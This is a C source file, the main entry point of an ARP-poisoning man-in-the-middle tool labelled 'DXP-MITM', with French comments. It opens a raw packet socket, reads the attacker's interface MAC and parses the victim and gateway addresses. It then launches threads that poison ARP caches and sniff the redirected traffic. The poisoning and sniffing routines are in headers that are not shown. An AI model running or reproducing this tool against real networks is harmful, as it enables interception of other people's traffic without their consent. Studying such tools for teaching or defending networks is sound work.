    #include <stdio.h>         // printf, perror
    #include <stdlib.h>        // EXIT_SUCCESS / EXIT_FAILURE
    #include <string.h>        // strncpy, memset
    #include <unistd.h>        // close
    #include <arpa/inet.h>     // inet_pton
    #include <sys/socket.h>    // socket
    #include <sys/ioctl.h>     // ioctl
    #include <net/if.h>        // struct ifreq
    #include <netinet/in.h>    // struct in_addr
    #include <net/ethernet.h>
    #include <netpacket/packet.h>

    #include <pthread.h>       // threads

    #include "poisoning.h"     // mitm_ctx, poison_thread
    #include "sniffer.h"       // sniffer_thread

    int main(int ac, char *av[])
    {
        if (ac != 6)
        {
            printf("FORMAT : %s <interface> <IP_victime> <IP_gateway> <MAC_victime> <MAC_gateway>\n", av[0]);
            return EXIT_FAILURE;
        }

        mitm_ctx ctx; 
        memset(&ctx, 0, sizeof(ctx));
        // Création du socket qui va travailler sur la couche 2 ( modèle OSI )
        ctx.raw_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

        if (ctx.raw_sock == -1)
        {
            perror("ERROR ! (socket)");
            exit(EXIT_FAILURE);
        }

        strncpy(ctx.iface, av[1], IF_NAMESIZE - 1);
        ctx.iface[IF_NAMESIZE -1] = '\0';

        // Prépare struct ifreq avec le nom de l’interface (pour les ioctl suivants)
        struct ifreq iface_req;    
        memset(&iface_req, 0, sizeof(iface_req));
        strncpy(iface_req.ifr_name, ctx.iface, IF_NAMESIZE - 1);

        // ioctl SIOCGIFHWADDR : récupère l’adresse MAC de l’interface (remplit iface_req.ifr_hwaddr)
        if (ioctl(ctx.raw_sock, SIOCGIFHWADDR, &iface_req) == -1)
        {
            perror("ERROR ! (ioctl - SIOCGIFHWADDR)");
            close(ctx.raw_sock);
            exit(EXIT_FAILURE);
        }

        unsigned char *mac = (unsigned char *)iface_req.ifr_hwaddr.sa_data;
        memcpy(ctx.attacker_mac, mac, 6);

        memset(&iface_req, 0, sizeof(iface_req));
        strncpy(iface_req.ifr_name, ctx.iface, IF_NAMESIZE - 1);

        if (ioctl(ctx.raw_sock, SIOCGIFINDEX, &iface_req) == -1)
        {
            perror("ERROR ! (ioctl - SIOCGIFINDEX)");
            close(ctx.raw_sock);
            exit(EXIT_FAILURE);
        }

        ctx.if_index = iface_req.ifr_ifindex;

        // Convertit les IP victime / gateway (strings) en struct in_addr dans le contexte
        inet_pton(AF_INET, av[2], &ctx.victim_ip);
        inet_pton(AF_INET, av[3], &ctx.gateway_ip);


        // Parse les adresses MAC victime et gateway (format xx:xx:xx:xx:xx:xx)
        sscanf(av[4], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &ctx.victim_mac[0], &ctx.victim_mac[1],
                                                       &ctx.victim_mac[2], &ctx.victim_mac[3],
                                                       &ctx.victim_mac[4], &ctx.victim_mac[5]);

        sscanf(av[5], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &ctx.gateway_mac[0], &ctx.gateway_mac[1],
                                                       &ctx.gateway_mac[2], &ctx.gateway_mac[3],
                                                       &ctx.gateway_mac[4], &ctx.gateway_mac[5]);


        printf("[DXP-MITM] Interface IP  : %s\n", av[1]);
        printf("[DXP-MITM] Victime IP    : %s\n", av[2]);
        printf("[DXP-MITM] Gateway IP    : %s\n", av[3]);
        printf("[DXP-MITM] Victim MAC    : %s\n", av[4]);
        printf("[DXP-MITM] Gateway MAC   : %s\n", av[5]);
        printf("[DXP-MITM] Attaquant MAC : %02x:%02x:%02x:%02x:%02x:%02x\n", ctx.attacker_mac[0], ctx.attacker_mac[1],
                                                                            ctx.attacker_mac[2], ctx.attacker_mac[3],
                                                                            ctx.attacker_mac[4], ctx.attacker_mac[5]);


        pthread_t t_poison, t_sniff;

        pthread_create(&t_poison, NULL, poison_thread, &ctx);
        pthread_create(&t_sniff, NULL,  sniffer_thread, &ctx);

        pthread_join(t_poison, NULL);
        pthread_join(t_sniff, NULL);

        return EXIT_SUCCESS;
    }